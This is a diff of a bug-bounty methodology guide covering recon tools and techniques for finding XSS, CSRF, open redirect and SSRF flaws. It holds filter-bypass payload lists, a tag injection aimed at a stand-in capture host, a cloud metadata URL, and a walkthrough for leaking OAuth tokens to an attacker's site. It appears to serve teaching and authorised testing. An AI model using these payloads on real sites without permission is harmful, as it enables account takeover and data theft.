@@ -1,33 +1,19 @@
-# BugBounty
+# BugBounty Methodology
 
-## BugBounty
-
-### [https://github.com/bugcrowd/templates](https://github.com/bugcrowd/templates)
+{% embed url="https://github.com/bugcrowd/templates" %}
 
 ### Good PoC
 
-| Issue type                     | PoC                                                                                                                                                                                                                                                                                                                                  |
-| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| Cross-site scripting           | `alert(document.domain)` or `` setInterval`alert\x28document.domain\x29` `` if you have to use backticks. [\[1\]](https://medium.com/@know.0nix/jumping-to-the-hell-with-10-attempts-to-bypass-devils-waf-4275bfe679dd) Using `document.domain` instead of `alert(1)` can help avoid reporting XSS bugs in sandbox domains.          |
-| Command execution              | <p>Depends of program rules:</p><ul><li>Read (Linux-based): <code>cat /proc/1/maps</code></li><li>Write (Linux-based): <code>touch /root/your_username</code></li><li>Execute (Linux-based): <code>id</code></li></ul>                                                                                                               |
-| Code execution                 | <p>This involves the manipulation of a web app such that server-side code (e.g. PHP) is executed.</p><ul><li>PHP: <code>&#x3C;?php echo 7*7; ?></code></li></ul>                                                                                                                                                                     |
-| SQL injection                  | <p>Zero impact</p><ul><li>MySQL and MSSQL: <code>SELECT @@version</code></li><li>Oracle: <code>SELECT version FROM v$instance;</code></li><li>Postgres SQL: <code>SELECT version()</code></li></ul>                                                                                                                                  |
-| Unvalidated redirect           | <ul><li>Set the redirect endpoint to a known safe domain (e.g. <code>google.com</code>), or if looking to demonstrate potential impact, to your own website with an example login screen resembling the target's.</li><li>If the target uses OAuth, you can try to leak the OAuth token to your server to maximise impact.</li></ul> |
-| Information exposure           | Investigate only with the IDs of your own test accounts — do not leverage the issue against other users' data — and describe your full reproduction process in the report.                                                                                                                                                           |
-| Cross-site request forgery     | When designing a real-world example, either hide the form (`style="display:none;"`) and make it submit automatically, or design it so that it resembles a component from the target's page.                                                                                                                                          |
-| Server-side request forgery    | <p>The impact of a SSRF bug will vary — a non-exhaustive list of proof of concepts includes:</p><ul><li>reading local files</li><li>obtaining cloud instance metadata</li><li>making requests to internal services (e.g. Redis)</li><li>accessing firewalled databases</li></ul>                                                     |
-| Local file read                | Make sure to only retrieve a harmless file. Check the program security policy as a specific file may be designated for testing.                                                                                                                                                                                                      |
-| XML external entity processing | Output random harmless data.                                                                                                                                                                                                                                                                                                         |
-| Sub-domain takeover            | Claim the sub-domain discreetly and serve a harmless file on a hidden page. Do not serve content on the index page.                                                                                                                                                                                                                  |
+<table><thead><tr><th width="374">Issue type</th><th>PoC</th></tr></thead><tbody><tr><td>Cross-site scripting</td><td><code>alert(document.domain)</code> or <code>setInterval`alert\x28document.domain\x29`</code> if you have to use backticks. <a href="https://medium.com/@know.0nix/jumping-to-the-hell-with-10-attempts-to-bypass-devils-waf-4275bfe679dd">[1]</a> Using <code>document.domain</code> instead of <code>alert(1)</code> can help avoid reporting XSS bugs in sandbox domains.</td></tr><tr><td>Command execution</td><td><p>Depends of program rules:</p><ul><li>Read (Linux-based): <code>cat /proc/1/maps</code></li><li>Write (Linux-based): <code>touch /root/your_username</code></li><li>Execute (Linux-based): <code>id</code></li></ul></td></tr><tr><td>Code execution</td><td><p>This involves the manipulation of a web app such that server-side code (e.g. PHP) is executed.</p><ul><li>PHP: <code>&#x3C;?php echo 7*7; ?></code></li></ul></td></tr><tr><td>SQL injection</td><td><p>Zero impact</p><ul><li>MySQL and MSSQL: <code>SELECT @@version</code></li><li>Oracle: <code>SELECT version FROM v$instance;</code></li><li>Postgres SQL: <code>SELECT version()</code></li></ul></td></tr><tr><td>Unvalidated redirect</td><td><ul><li>Set the redirect endpoint to a known safe domain (e.g. <code>google.com</code>), or if looking to demonstrate potential impact, to your own website with an example login screen resembling the target's.</li><li>If the target uses OAuth, you can try to leak the OAuth token to your server to maximise impact.</li></ul></td></tr><tr><td>Information exposure</td><td>Investigate only with the IDs of your own test accounts — do not leverage the issue against other users' data — and describe your full reproduction process in the report.</td></tr><tr><td>Cross-site request forgery</td><td>When designing a real-world example, either hide the form (<code>style="display:none;"</code>) and make it submit automatically, or design it so that it resembles a component from the target's page.</td></tr><tr><td>Server-side request forgery</td><td><p>The impact of a SSRF bug will vary — a non-exhaustive list of proof of concepts includes:</p><ul><li>reading local files</li><li>obtaining cloud instance metadata</li><li>making requests to internal services (e.g. Redis)</li><li>accessing firewalled databases</li></ul></td></tr><tr><td>Local file read</td><td>Make sure to only retrieve a harmless file. Check the program security policy as a specific file may be designated for testing.</td></tr><tr><td>XML external entity processing</td><td>Output random harmless data.</td></tr><tr><td>Sub-domain takeover</td><td>Claim the sub-domain discreetly and serve a harmless file on a hidden page. Do not serve content on the index page.</td></tr></tbody></table>
 
-### Good Report
+### Bug Writeups&#x20;
+
+{% embed url="https://github.com/devanshbatham/Awesome-Bugbounty-Writeups" %}
+
+### Bug bounty Report
 
 ```
-# Writeups
-# https://github.com/devanshbatham/Awesome-Bugbounty-Writeups
-```
 
-```
 # Bug bounty Report
 
 # Summary
@@ -49,126 +35,138 @@
 ...
 ```
 
-#### Report flow
+### Report flow
 
 <figure><img src="https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M5x1LJiRQvXWpt04_ee%2Fuploads%2FUivxYDHrBWPt657b4oB2%2FUntitled%20diagram-2025-03-14-131837.png?alt=media&#x26;token=51447d74-5000-4129-b6de-de42e8f857a0" alt=""><figcaption></figcaption></figure>
 
-\#Recon #webhacking [bugbountyhunter](https://www.bugbountyhunter.com/) [Tools to use](obsidian://open?vault=Obsidian%20Vault\&file=3.%20Resource%2FTopics%20interest%2Fhacking%20tool%20collection)
+
 
 How website work with HTML,CSS and JavaScript [HTML](https://www.jsfiddle.net/) [JavaScript](https://www.jsbin.com/)
 
-### Don't over Complicate things
+{% embed url="https://www.jsfiddle.net/" %}
+
+## Don't over Complicate things
 
 * logging in
 * Commenting on a post
 
-### Questioning
+## Questioning
 
-* what did they consider when setting this up?
-* Can i maybe find a vulnerability here?
-* Can you comment with basic HTML such a `<h2>`
-* where is it reflected on the page?
-* Can i input XSS in my name
-* Does it make any requests to an /api/endpoint
-* Which may contain more interesting endpoints?
-* Can i edit this post?
-* Maybe there's IDOR?!
+* [ ] **what did they consider when setting this up?**
+* [ ] **Can i maybe find a vulnerability here?**
+* [ ] **Can you comment with basic HTML such a `<h2>`**
+* [ ] **where is it reflected on the page?**
+* [ ] **Can i input XSS in my name**
+* [ ] **Does it make any requests to an /api/endpoint**
+* [ ] **Which may contain more interesting endpoints?**
+* [ ] **Can i edit this post?**
+* [ ] **Maybe there's IDOR?!**
 
-### Developer experience
+## Developer experience
+
+* [ ] **Understanding what a payload is trying to achieve?**
+* [ ] **Why and how did a hacker come up with this payload?**
+* [ ] **What does it do?**
+* [ ] **why did they need to come up with this a payload?**
+* [ ] **Combine this with playing with basic HTML**
+* [ ] **What path/parameter does the code take (POST or GET,json post data etc)**
+* [ ] **brute force some common parameters (can get lucky on guessing)**
+
+{% hint style="danger" %}
+\[Be curious and just try,You can't be wrong]
+{% endhint %}
 
 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
-* Understanding what a payload is trying to achieve?
-* Why and how did a hacker come up with this payload?
-* What does it do?
-* why did they need to come up with this a payload?
-* Combine this with playing with basic HTML
-* What path/parameter does the code take (POST or GET,json post data etc)
-* brute force some common parameters (can get lucky on guessing)
-
-\[Be curious and just try,You can't be wrong]
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings" %}
 
 ### Real life example / Vulnerability Disclosure program
 
 Google search companies ready to work with researchers
 
-* “responsible disclosure program”
-* “vulnerability disclosure program”
-* “vulnerability program rewards”
-* “bugbounty reward program”
-* inurl: vulnerability disclosure
-* inurl: responsible disclosure
+* <mark style="color:$success;">“responsible disclosure program”</mark>
+* <mark style="color:$success;">“vulnerability disclosure program”</mark>
+* <mark style="color:$success;">“vulnerability program rewards”</mark>
+* <mark style="color:$success;">“bugbounty reward program”</mark>
+* <mark style="color:$success;">inurl: vulnerability disclosure</mark>
+* <mark style="color:$success;">inurl: responsible disclosure</mark>
 
-### My basic toolkit
+## <mark style="color:$danger;">My basic toolkit</mark>
+
+
 
 1. **Burp Suite for intercept,Modify & repeat on the fly**
    * Community edition and work although Professional edition can be used to install plugins and collaborator
-   * [burp collaborator client](https://portswigger.net/burp/documentation/collaborator/deploying)
-   * [BApp Store](https://portswigger.net/bappstore)
+   * [**burp collaborator client**](https://portswigger.net/burp/documentation/collaborator/deploying)
+   * [**BApp Store**](https://portswigger.net/bappstore)<br>
 2. **OWASP?Amass Discovering subdomains**,
    * It uses the most sources for discovery with a mixture of passive, active
-   * [Amass](https://github.com/OWASP/Amass)
+   * [**Amass**](https://github.com/OWASP/Amass)
      * Subdomains
-     * `amass enum -brute -active -d domain.com -o amass-output.txt`
+     * `amass enum -brute -active -d domain.com -o amass-output.txt`<br>
 3. **Httprobe**
    * Find working http and https servers
-   * [httprobe](https://github.com/tomnomnom/httprobe)
+   * [**httprobe**](https://github.com/tomnomnom/httprobe)
    * Extra ports by setting the -p flag
-     * `cat amass-output.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p http:8000 -p http:8080 -p https:8443 -c 50 | tee online-domains.txt`
+     * `cat amass-output.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p http:8000 -p http:8080 -p https:8443 -c 50 | tee online-domains.txt`<br>
 4. **Anew Domain**
    * play nicely as the new domain go straight to stdout,
-   * [anew](https://github.com/tomnomnom/anew)
-     * `cat new-output.txt | a new old-output.txt | httprobe`
+   * [**anew**](https://github.com/tomnomnom/anew)
+     * `cat new-output.txt | a new old-output.txt | httprobe`<br>
 5. **Dnsgen**
    * For thorough check finding some gems,
-   * [dnsgen](https://github.com/ProjectAnte/dnsgen)
-     * \`cat amass-output.txt | dnsgen - | httprobe
+   * [**dnsgen**](https://github.com/ProjectAnte/dnsgen)
+     * \`cat amass-output.txt | dnsgen - | httprobe<br>
 6. **Aquatone**
    * For visual inspection is a good idea
-   * [aquatone](https://github.com/michenriksen/aquatone)
+   * [**aquatone**](https://github.com/michenriksen/aquatone)
    * its accepts endpoints and files, not just domains
-     * `cat domains-endpoints.txt | aquatone`
+     * `cat domains-endpoints.txt | aquatone`<br>
 7. **FFUF**
    * The fastest and most customisable
-   * [ffuf](https://github.com/ffuf/ffuf)
-   * `ffuf -ac -v -u https://domain/FUZZ -w wordlist.txt`
+   * [**ffuf**](https://github.com/ffuf/ffuf)
+   * `ffuf -ac -v -u https://domain/FUZZ -w wordlist.txt`<br>
 8. **Wordlists**
    * SecLists contains every type of scanning
-   * [seclists](https://github.com/danielmiessler/SecLists/)
-   * Grad a list and start scanning see what you can find
+   * [**seclists**](https://github.com/danielmiessler/SecLists/)
+   * Grad a list and start scanning see what you can find<br>
 9. **CommonSpeak**
    * Generate new wordlists based on keywords found on the program
-   * [commonspeak](https://github.com/pentester-io/commonspeak)
-   * [Usage](https://pentester.io/commonspeak-bigquery-wordlists/)
+   * [**commonspeak**](https://github.com/pentester-io/commonspeak)
+   * [**Usage**](https://pentester.io/commonspeak-bigquery-wordlists/)<br>
 10. **Custom Tools**
     * Github for collection of random useful hacking scripts
-    * [hacking Scripts](https://github.com/tomnomnom)
+    * [**hacking Scripts**](https://github.com/tomnomnom)<br>
 11. **WaybackMachine scanner**
     * this scrape /robots.txt for all domains and also scrape the main homepage of each subdomain
     * Then scan each end point using Burpintruder or FFuF to detamine which end point are still alive
-    * [publicTool](https://gist.github.com/mhmdiaa)
-    * some of the old files are still there indexed
+    * [**publicTool**](https://gist.github.com/mhmdiaa)
+    * some of the old files are still there indexed<br>
 12. **ParamScanner**
     * custom tool used to scrape each endpoint and discover search for inputs names & ID and try its parameters
     * its also search for var{name}=""
-    * [javascriptfile](https://gist.github.com/mhmdiaa)
-    * [URLs javascriptfiles](https://github.com/GerbenJavado/LinkFinder)
-    * [parameth](https://github.com/maK-/parameth) brute forcing parameters
+    * [**javascriptfile**](https://gist.github.com/mhmdiaa)
+    * [**URLs javascriptfiles**](https://github.com/GerbenJavado/LinkFinder)
+    * [**parameth**](https://github.com/maK-/parameth) brute forcing parameters
 
+{% hint style="warning" %}
 \[Note : The trend for my tool is to find new content, parameters and functionality to poke at. ]
+{% endhint %}
 
-### Common issues I start with & why
+## Common issues I start with & why
 
-* Stick to what you know best to create an impact with your feelings
-* Common bugs for on bug bounty programs and spend much time learning how the web application works.
-* Developers make the same mistakes over internet
-* Look through the design of the application
-* The trend they are following (open source flame works)
-* Look for filters in place and aim to bypass these
+* **Stick to what you know best to create an impact with your feelings**
+* **Common bugs for on bug bounty programs and spend much time learning how the web application works.**
+* **Developers make the same mistakes over internet**
+* **Look through the design of the application**
+* **The trend they are following (open source flame works)**
+* **Look for filters in place and aim to bypass these**
 
 ### 1. Cross Site Scripting (XSS)
 
+{% hint style="success" %}
 \#xss
+{% endhint %}
 
 * This is the most common vulnerabilities found on the bug bounty program
 * Input your HTML into a parameter/field and the website reflect it as valid HTML
@@ -178,89 +176,114 @@ Google search companies ready to work with researchers
 * Test every parameter to find out if its reflected
 * as we test we can also look for Blind XSS and Reflective XSS
 * The only hardship is to bypass the WAFs. there is no clear way to do it execpt try and error and also look for other researchers how they bypassed them
-  * [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF)
+  * [**Awesome-WAF**](https://github.com/0xInfection/Awesome-WAF)
 * Remember to create a lead.
 * if we receive a filter, it comes that the parameter we are testing is vulnerable to XSS
 * But the developer created a filter to prevent any malicious HTML
 * This should also be one of the reason you spending looking for XSS
 * if they are filtering certain payloads, it can give you a feel for the overall security of their site
 * This is an easy bug to prevent, so its easy to create filter
-*   Think of SSRF filtering just internal IP addresses? perhaps they forgot about
+* Think of SSRF filtering just internal IP addresses? perhaps they forgot about
+  * http://169.254.169.254/latest/meta-data chances are they did.<br>
 
-    * http://169.254.169.254/latest/meta-data chances are they did.
+### Process for testing for XSS & Filtering
 
-    ### Process for testing for XSS & Filtering
+#### **Step one: Testing different encoding and checking for any weird behaviour**
 
-    * **Step one: Testing different encoding and checking for any weird behaviour**
-      * find out what payloads are allowed on the parameter how the website reflects/handle it
-        * most basic `<h2>,<img>,<table>` without any flitering
-        * is it reflected as HTML?
-        * are they filtering malicous HTML?
-        * if its reflected as `&it`or `%3c` ?
-        * test the double encoding `%253C` and `%26it`
-        * Some other interesting encodings to try out [ghettoBypass](https://d3adend.org/xss/ghettoBypass)
-      * This is test is to find out what's allowed and isn't and how they handle our payload
-        * Example: if `<script>` was reflected as `&it;script&gt;` but `%26itscript%26gt`was reflected as `<script>`
-        * Then i know am on to a bypass and i can begin to understand how they are handling encodings
-        * Which can help in finding other bugs
-        * If not matter what you always see `&it;script&gt;` or `%3script%3E` then the parameter may not be vulnerable
-    * **Step Two : Reverse engineering the developers' thoughts (this gets easier) with time experience.**
-      * Getting into the developers head as check what type of filters they've created.
-      * And start asking why?
-      * Does this filter exist elsewhere throughout the webapp?
-        * Example: Notice if they are filtering `<script>`,`<iframe>` aswell as `"onerror="` but notice they aren't filtering `<script`then we know it's a game on and time to be creative.
-        * Are they only looking for complete valid HTML tags?
-        * if so we can bypass with `<scriptsrc=//mysite.com?c=`
-        * if we don't end the tag and its instead appended as a parameter value .
-        * is it just a blacklist of bad HTML tags?
-        * may the developer is not up to date and forgot things such as `<svg>`
-        * if it is just a blacklist, then does this blacklist exist elsewhere?
-        * lets thinks about file uploads.
-      * how does this website handle encodings? `<00iframe>`, `on%0derror`
-      * Try many different combinations as possible with different encoding, format
-      * The more you poke the more you learn
-      * More payloads [xsspayloads](https://zseano.com/)
-    * **Testing for XSS flow**
-      * how are "non-malicious" HTML tags such as `<h2>` handled?
-      * What about incomplete tags? `<iframe src=//hamcodes.com/c=`
-      * How do they handle encodings such as `<00h2`?
-      * There are LOTS to try here, `%0d`, `%0a`,`%09` etc
-      * is it just a blacklist or hardcoded strings?
-      * Does `</script/x>`work? `<ScRipt>`etc.
-    * \==Following this process will help you approach XSS from all angles and determine what filtering may be in place and you can usually get a clear indication if a parameter is vulnerable to XSS within a few minute==
+> find out what payloads are allowed on the parameter how the website reflects/handle it
 
-[Agreat resource](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
+**Most basic `<h2>,<img>,<table>` without any flitering**
+
+* [ ] is it reflected as HTML?
+* [ ] are they filtering malicous HTML?
+* [ ] if its reflected as `&it`or `%3c` ?
+
+**Test the double encoding `%253C` and `%26it`**
+
+* Some other interesting encodings to try out [**ghettoBypass**](https://d3adend.org/xss/ghettoBypass)
+* This is test is to find out what's allowed and isn't and how they handle our payload
+  * Example: if `<script>` was reflected as `&it;script&gt;` but `%26itscript%26gt`was reflected as `<script>`
+  * Then i know am on to a bypass and i can begin to understand how they are handling encodings
+  * Which can help in finding other bugs
+  * If not matter what you always see `&it;script&gt;` or `%3script%3E` then the parameter may not be vulnerable<br>
+
+#### **Step Two : Reverse engineering the developers' thoughts (this gets easier) with time experience.**
+
+* Getting into the developers head as check what type of filters they've created.
+* And start asking why?
+* how does this website handle encodings? `<00iframe>`, `on%0derror`
+
+- [ ] Does this filter exist elsewhere throughout the webapp?
+- [ ] Example: Notice if they are filtering `<script>`,`<iframe>` aswell as `"onerror="` but notice they&#x20;
+- [ ] aren't filtering `<script`then we know it's a game on and time to be creative.
+- [ ] Are they only looking for complete valid HTML tags?
+- [ ] if so we can bypass with `<scriptsrc=//mysite.com?c=`
+- [ ] if we don't end the tag and its instead appended as a parameter value .
+- [ ] is it just a blacklist of bad HTML tags?
+- [ ] may the developer is not up to date and forgot things such as `<svg>`
+-   [ ] if it is just a blacklist, then does this blacklist exist elsewhere?
+
+    lets thinks about file uploads.
+
+* Try many different combinations as possible with different encoding, format
+* The more you poke the more you learn
+* More payloads [**xsspayloads**](https://zseano.com/)
+
+#### **Testing for XSS flow**
+
+* how are "non-malicious" HTML tags such as `<h2>` handled?
+* What about incomplete tags? `<iframe src=//hamcodes.com/c=`
+* How do they handle encodings such as `<00h2`?
+* There are LOTS to try here, `%0d`, `%0a`,`%09` etc
+* is it just a blacklist or hardcoded strings?
+* Does `</script/x>`work? `<ScRipt>`etc.
+* \==Following this process will help you approach XSS from all angles and determine what filtering may be in place and you can usually get a clear indication if a parameter is vulnerable to XSS within a few minute==
+
+[**Agreat resource**](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
+
+
 
 ### 2. Cross Site Request Forgery(CSRF)
 
+{% hint style="danger" %}
 \#csrf
+{% endhint %}
 
-* This involves forcing users to do a specific action on the target website from your website
-  * Via HTML form `(<form action= "/login"method="POST"> )`
-  * Example: CSRF bug is forcing user to change their account email to one controlled by you.
-  * it can lead to account takeover
-* Developers can protect CRSF easily but some opt to create custom code instead.
-* when hunting for this bug, Look at areas on website with protection around them
-  * Such as updating your account information
-  * This can also give you a clear security on the system site **Question**
-  * What behaviour do you see when sending a blank CSRF value?
-  * Did it reveal any framework information from an error?
-  * Did it reflect your changes but with a CSRF error?
-  * Have you seen this parameter name used on other websites?
-  * Maybe there isn't even any protection?
+**This involves forcing users to do a specific action on the target website from your website**
+
+* Via HTML form `(<form action= "/login"method="POST"> )`
+* Example: CSRF bug is forcing user to change their account email to one controlled by you.
+* it can lead to account takeover
+* Developers can protect CRSF easily but some opt to create custom code instead.<br>
+
+**when hunting for this bug, Look at areas on website with protection around them**
+
+* Such as updating your account information
+* This can also give you a clear security on the system site **Question**
+* What behaviour do you see when sending a blank CSRF value?
+* Did it reveal any framework information from an error?
+* Did it reflect your changes but with a CSRF error?
+* Have you seen this parameter name used on other websites?
+* Maybe there isn't even any protection?
 * Test their most secure features(account functions usually as mentioned above)
-  * Then work your way backwards
-* Some feature may have different CRSF protection as you continue to test the site.
-  * Consider why is it ?
-  * Different team?
-  * Old codebase?
-  * perhaps a different parameter name is used
-  * Now you can hunt specifically for this parameter knowing its vulnerable.
+  * Then work your way backwards<br>
+
+**Some feature may have different CRSF protection as you continue to test the site.**
+
+* Consider why is it ?
+* Different team?
+* Old codebase?
+* perhaps a different parameter name is used
+* Now you can hunt specifically for this parameter knowing its vulnerable.
 * Developers only check the referrer header value, if its not their website then drop the request.
 * This backfires by getting a blank referrer, if the checks only execute when the referrer header is actually found, and if it isn't no checks done .
   * `<meta name="referrer" content="no-referrer"/>`
   * `iframe src="data:text/html;baseˆ$,form_code_here">`
-* Sometimes they only check their domain. if found in the referrer
+
+
+
+**Sometimes they only check their domain. if found in the referrer**
+
 * Creating a directory on your site & visit https://www.yoursite.com/https://www.theirsite.com/
 * This may bypass the checks.
 * what about https://www.theirsite.computer/?
@@ -283,161 +306,191 @@ Google search companies ready to work with researchers
   * when visited it redirects to the URL provided in the parameter
   * Alot of developers fail to create any type of filtering/restriction on these
   * So they are very easy to find.
-* Filter sometimes can exist to stop you
-* below are some of the payload i use to bypass filters the can also be used to determine how their filter is working.
-  * `\/yoururl.com`
-  * \`//yoururl.com
-  * `\\yoururl.com`
-  * `//yoururl.com`
-  * `//theirsite@yoursite.com`
-  * \`//yoursite.com
-  * `https://yoursite.com%3F.theirsite.com/`
-  * `https//yoursite.com%2523.theirsite.com/`
-  * \`https://yoursite?c=.theirsite.com(use # \ also)
-  * `//%2F/yoursite.com`
-  * `////yoursite.com`
-  * `https://theirsite.computer/`
-  * `https://theirsite.com.mysite.com`
-  * \`/%0D/yoursite.com (Also try %09, %00, %0a, %07)
-  * `/%2F/yoururl.com`
-  * `/%5Cyoururl.com`
-  * `//google%E3%80%82com`
-* Some common words i dork for on google to find end points:(Test upper & lower case too)
-  * `return`
-  * `return_url`
-  * `rUrl`
-  * `cancelUrl`
-  * `url`
-  * `redirect`
-  * `follow`
-  * `goto`
-  * `returnTo`
-  * `returnUrl`
-  * `r_Url`
-  * `history`
-  * `goback`
-  * `redirectTo`
-  * `redirectUrl`
-  * `redirUrl`
+
+**Filter sometimes can exist to stop you**
+
+below are some of the payload i use to bypass filters the can also be used to determine how their filter is working.
+
+* `\/yoururl.com`
+* \`//yoururl.com
+* `\\yoururl.com`
+* `//yoururl.com`
+* `//theirsite@yoursite.com`
+* \`//yoursite.com
+* `https://yoursite.com%3F.theirsite.com/`
+* `https//yoursite.com%2523.theirsite.com/`
+* \`https://yoursite?c=.theirsite.com(use # \ also)
+* `//%2F/yoursite.com`
+* `////yoursite.com`
+* `https://theirsite.computer/`
+* `https://theirsite.com.mysite.com`
+* \`/%0D/yoursite.com (Also try %09, %00, %0a, %07)
+* `/%2F/yoururl.com`
+* `/%5Cyoururl.com`
+* `//google%E3%80%82com`
+
+**Some common words i dork for on google to find end points:(Test upper & lower case too)**
+
+* `return`
+* `return_url`
+* `rUrl`
+* `cancelUrl`
+* `url`
+* `redirect`
+* `follow`
+* `goto`
+* `returnTo`
+* `returnUrl`
+* `r_Url`
+* `history`
+* `goback`
+* `redirectTo`
+* `redirectUrl`
+* `redirUrl`
 * let's take advantage of our findings
   * more about how Oauth login works #Auth
-  * [Ouath](https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2.)
-* The login page look like this:
-  * https://www.target.com/login?client\_id=123\&redirect\_url=/sosecure
-  * the redirected _url_ will be whitelisted to only allow for `*.target.com/*`
-  * Spot the mistake?
-  * Armed with an open url redirect on their website, you can leak the token
-  * As the redirect occurs the token is smuggled with request.
-  * The user is sent to
-    * https://www.target.com/login?client\_id=123\&redirect\_url=https://www.target.com/redirect?redirect=1\&url=https://www.hamcodes.com/
-  * to the attackers website along with their token used for Authentication
+  * [**Ouath**](https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2.)<br>
+
+**The login page look like this:**
+
+* https://www.target.com/login?client\_id=123\&redirect\_url=/sosecure
+* the redirected _url_ will be whitelisted to only allow for `*.target.com/*`
+* Spot the mistake?
+* Armed with an open url redirect on their website, you can leak the token
+* As the redirect occurs the token is smuggled with request.
+* The user is sent to
+  * https://www.target.com/login?client\_id=123\&redirect\_url=https://www.target.com/redirect?redirect=1\&url=https://www.hamcodes.com/
+* to the attackers website along with their token used for Authentication
 * Account takeover report incoming!
 * One common problem people run into is not encoding the values correctly
 * Especially if the target only allows for /localRedirects
-  * My payload will look like
-    * `/redirect?goto=https://hamcodes.com/`
-    * Using `?goto=parameter` may get dropped in redirects(depending on how the web application works and how many redirects occurs)
-    * This can be case if it contain multiple parameters (via &)
-    * And the redirect parameter maybe missed
-    * I'll also encode certain values such as & ? # / \ to force the browser to decode it after the first redirect
-      * `Location: /redirect%3Fgoto=https://www.hamcodes.com/%253Fexample=hax`
-    * which then redirects the browser and then kindly decode %3F in the BROWSER URL to?,
-    * the parameter were successfully sent through
-      * `https://www.example.com/redirect?goto=https://www.hamcodes.com/%3Fexample=hax,`
-    * which then when it redirects again will allow the ?example parameter to also be sent.
-  * sometimes I'll double encode them based on how many redirects are made & parameters.
-    * `https://example.com/login?return=https://example.com/?redirect=1%26returnurl=http s%3A%2F%2Fwww.google.com%2F`
-    * `https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Fredirect=1%2526returnurl%3Dhttps%253A%252F%252Fwww.google.com%252F`
+
+
+
+**My payload will look like**
+
+* `/redirect?goto=https://hamcodes.com/`<br>
+* Using `?goto=parameter` may get dropped in redirects(depending on how the web application works and how many redirects occurs)<br>
+* This can be case if it contain multiple parameters (via &)
+* And the redirect parameter maybe missed
+* I'll also encode certain values such as & ? # / \ to force the browser to decode it after the first redirect
+  * `Location: /redirect%3Fgoto=https://www.hamcodes.com/%253Fexample=hax`<br>
+* which then redirects the browser and then kindly decode %3F in the BROWSER URL to?,
+* the parameter were successfully sent through
+  * `https://www.example.com/redirect?goto=https://www.hamcodes.com/%3Fexample=hax,`<br>
+* which then when it redirects again will allow the ?example parameter to also be sent.
+* sometimes I'll double encode them based on how many redirects are made & parameters.
+  * `https://example.com/login?return=https://example.com/?redirect=1%26returnurl=http s%3A%2F%2Fwww.google.com%2F`<br>
+  * `https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Fredirect=1%2526returnurl%3Dhttps%253A%252F%252Fwww.google.com%252F`<br>
 * When hunting for url redirects they can also be used in SSRF
 * If the redirect you discover is via the “==Location==:” header then XSS will not be possible
 * if it redirected via something like “==window.location==” then you should test for “==javascript==:” instead of redirecting to your website as XSS will be possible here.
-* **Some common ways to bypass filters**:
-  * java%0d%0ascript%0d%0a:alert(0)
-  * j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` java%07script:prompt`0`
-  * java%09scrip%07t:prompt`0`
-  * jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
-  * pjavascriptt:confirm`0`
+
+**Some common ways to bypass filters**:
+
+* java%0d%0ascript%0d%0a:alert(0)
+* j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` java%07script:prompt`0`
+* java%09scrip%07t:prompt`0`
+* jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
+* pjavascriptt:confirm`0`
 
 ## Server Side Request Forgery (SSRF)
 
+{% hint style="danger" %}
 \#SSRF
+{% endhint %}
 
 * This is the in-scope domain issuing a request to an URL/endpoint you've defined.
 * Sometimes it doesn't always signal the target is vulnerable.
-* when hunting for SSRF i look for features which already take an \_URL parameter
+* when hunting for SSRF i look for features which already take an \_URL parameter<br>
   * Why?
   * because i look for specific areas on website where the developer may have created filters to prevent malicious activity.
     * Example : I'll try finding their _API Console_ (i check on their developer docs page if available)
-      * These areas usually contains features which take \_URL parameter and execute
-* Think about _webhooks_ and hunt for features which handle _URLs_
+      * These areas usually contains features which take \_URL parameter and execute<br>
+
+**Think about&#x20;**_**webhooks**_**&#x20;and hunt for features which handle&#x20;**_**URLs**_
+
 * I keep an eye out for _common parameter names_ used for handling URLs
-  * An example is here from hackerone[Right $ clear](https://hackerone.com/reports/446593)
-* when Testing SSRF i always test how they handle redirects
-  * You can host a redirect locally via using XAMPP & NGrok.
-  * XAMPP allows you to run PHP code locally and ngrok gives you a public internet address
-    * _Don't forget to turn it off when finishe testing_
-  * for Tutorials to set XAMPP up [refer](https://www.bugbountyhunter.com/) Setup a simple redirect script and see if the target parses the redirect and follows
-  * What happen if you add sleep(1000) before the redirects?
-  * Can you cause the server to hang and timeout?
-  * Maybe their filter is only checking the parameter value!
-  * Does it check the redirect value and successfully allows you to read internal data?
-  * Try a potential open redirect you have discovered as part of you chain
-  * if they are filtering external websites.
+  * An example is here from hackeron**e**[**Right $ clear**](https://hackerone.com/reports/446593)<br>
+
+**when Testing SSRF i always test how they handle redirects**
+
+* You can host a redirect locally via using XAMPP & NGrok.<br>
+* XAMPP allows you to run PHP code locally and ngrok gives you a public internet address
+  * _Don't forget to turn it off when finishe testing_<br>
+* for Tutorials to set XAMPP up [refer](https://www.bugbountyhunter.com/) Setup a simple redirect script and see if the target parses the redirect and follows<br>
+
+**What happen if you add sleep(1000) before the redirects?**
+
+* Can you cause the server to hang and timeout?
+* Maybe their filter is only checking the parameter value!
+* Does it check the redirect value and successfully allows you to read internal data?
+* Try a potential open redirect you have discovered as part of you chain
+* if they are filtering external websites.
 * Hunt for third party software they may be using such as jira.
 * Stay up to date with the lastest CVE's.
 * software like this usually contains interesting server related features
 
 ## File uploads for stored XSS & remote code execution
 
+{% hint style="danger" %}
 \#xss
+{% endhint %}
 
-* Developers create filter as to what files to allow and what to block.
+**Developers create filter as to what files to allow and what to block.**
+
 * if files are stored on their domain then the first thing to check uploading is:
   * `.txt`
   * `.svg`
   * `.xml`
-* These three file sometimes are forgotten and slip the filter.
+
